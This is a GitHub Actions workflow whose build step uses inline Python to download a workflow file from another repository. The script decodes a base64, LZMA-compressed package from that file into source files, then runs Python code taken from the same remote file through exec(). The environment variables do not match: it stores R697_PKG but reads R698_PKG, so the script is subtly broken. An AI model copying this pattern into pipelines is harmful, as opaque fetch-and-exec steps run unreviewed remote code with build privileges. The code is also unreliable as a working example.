jobs:
  build:
    if: github.event.repository.private == false
    runs-on: xcode-27
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4
        with:
          ref: >-
            1e63efa4db514cc122f2940a39623d9bc65c554c
      - name: Verify R698 and build IPA
        shell: bash
        run: |
          python3 - <<'PYCODE'
          import os,re,base64,lzma,hashlib
          import pathlib,urllib.request,ast
          url=('https://raw.githubusercontent.com/'
            'zeek10191019-stack/'
            'true-plan-showdown-verification/'
            'main/.github/workflows/z0.yml')
          req=urllib.request.Request(url,headers={
            'User-Agent':'R698-Pinned-Builder'})
          with urllib.request.urlopen(
            req,timeout=40) as res:
            old=res.read(25000)
          assert len(old)==10232
          assert hashlib.sha256(old).hexdigest()==(
            '65c293261ad0a80a65b732d4e9ef5380'
            '85ebba32a783a6d937f1e3788439db54')
          m=re.search(rb'(?m)^  R697_PKG: >-\n'
            rb'((?:    [^\n]*\n)+)',old)
          assert m,'R697_PINNED_PACKAGE_MISSING'
          os.environ['R697_PKG']=b''.join(
            m[1].split()).decode('ascii')
          raw=lzma.decompress(base64.b64decode(
            os.environ['R698_PKG']),
            format=lzma.FORMAT_ALONE)
          assert hashlib.sha256(raw).hexdigest()==(
            'ac098f315438e9ceaf7bf5090b57f76b'
            '9010ed8d830e7d16266de21050cfe160')
          names=['R698EvidencePacketAudit.swift',
            'R698Patch.py','R698MakeBuild.py',
            'R698Smoke.swift']
          sizes=[8167, 1655, 3315, 8830]
          assert sum(sizes)==len(raw)
          pos=0
          for name,size in zip(names,sizes):
            folder='tests' if name.endswith(
              'Smoke.swift') else 'tools'
            p=pathlib.Path(folder)/name
            p.parent.mkdir(parents=True,
              exist_ok=True)
            p.write_bytes(raw[pos:pos+size])
            pos+=size
          print('R698_SOURCE_SHA_PASS',flush=True)
          text=old.decode('utf-8')
          marker="          python3 - <<'PYCODE'\n"
          start=text.index(marker)+len(marker)
          end=text.index('\n          PYCODE',start)
          block=text[start:end]
          body='\n'.join(line[10:] for line in
            block.splitlines())
          needle=("['python3','tools/"+
            "R697MakeBuild.py']")
          assert body.count(needle)==1
          body=body.replace(needle,
            "['python3','tools/R698MakeBuild.py']")
          ast.parse(body)
          exec(compile(body,'r697','exec'),{})
          PYCODE
      - uses: actions/upload-artifact@v4
        with:
          name: R698-unsigned-iLoader-IPA
          path: dist/R698*
          if-no-files-found: error
          retention-days: 7
